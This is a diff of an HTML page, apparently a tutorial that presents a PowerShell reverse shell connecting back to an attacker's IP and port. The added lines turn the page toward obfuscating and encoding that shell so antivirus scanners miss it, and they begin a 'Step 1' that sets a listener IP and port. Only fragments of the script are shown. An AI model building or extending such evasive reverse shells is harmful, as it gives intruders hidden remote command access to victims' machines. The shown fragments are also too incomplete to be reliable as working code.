@@ -100,7 +100,6 @@
   <div>
     <h3>PowerShell Snippet</h3>
     <pre><code>
-        #include <winsock2.h>
           <pre><code class="language-powershell">
             # Reverse Shell in PowerShell
             $ip = "192.168.1.100"
@@ -127,15 +126,21 @@
             $client.Close()
             </code></pre>            
 </div>
-      <h3>This is a generic reverse shell written in C. already, you can tell that this is very suspicious,
-         as it is very easy to guess whats going on. In a nutshell, this code generate a socket connection to the specified IP
-          and the port number, once the connection is established, it reads the commands sent by the attacker. </h3>
+      <h4>Already, you can tell that this is very suspicious, as it is very easy to guess whats going on. In a nutshell, this code generate a socket connection to the specified IP
+          and the port number, once the connection is established, it reads the commands sent by the attacker. </h4>
       
-      <h3>Lets save this and check its results on virustotal.com</h3>
+      <h4>Lets see how we can manage to make this a bit harder to detect, for this we will use some obfuscation and encoding
+        techniques, this will require refactoring the whole code, so we will start writing from scratch.
+      </h4>
 
+      <h1>Step 1: Specifying IP and port variables </h1>
+      <h4>We will assign the attacking IP and port variables as usual</h4>
+      <pre><code>
+        $ip='192.168.78.1'  # Change this to your listener IP
+        $p=9201 #Change this to your Listener Port
+      </code></pre>      
       
-      
-    </header>
+    
     <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><ul class="pa0">
   
 </ul>
